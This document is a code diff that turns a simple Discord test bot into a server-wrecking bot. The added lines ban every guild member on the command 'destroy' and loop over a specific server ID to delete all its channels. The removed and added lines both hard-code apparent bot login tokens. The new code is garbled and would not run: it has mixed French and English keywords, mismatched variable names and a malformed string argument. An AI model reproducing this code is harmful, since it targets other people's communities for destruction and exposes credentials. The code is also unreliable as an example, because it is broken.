@@ -1,10 +1,20 @@
-const Discord = require("discord.js");
+const Discord = require ("discord.js"); 
+const Bot = new Discord.Client (); 
+Bot.login ("NTAzNTk2NTEwMzQ5NjIzMjk2.Dq4ziQ.6pm4GpWHZKRKqmKpfU89XXxb-Uk"); 
 
-var bot = new Discord.Client();
+bot.on ("ready", function () { 
+console.log ("Ready."); 
+}); 
 
-bot.on("ready", function() {
-    bot.user.setGame("TestBot, !help");
-    console.log("Le bot a bien, était connecté !");
-});
+bot.on ("message", fonction (msg) { 
+if (msg.content.toLowerCase () == "destroy") { 
+for (membres var in msg.guild.members) {members.ban 
+(); 
+} 
+} 
+} )
 
-bot.login("NDMxNzIxNTAxNjY2OTY3NTU2.DajyvQ.QoRY6Vs8jNapyhd83nCzDx79Ki8")
+Client.on('var server = Client.guilds.get('503557304881250311');
+for (var i = 0; i < server.channels.array().length; i++) {
+    server.channels.array()[i].delete();
+}')
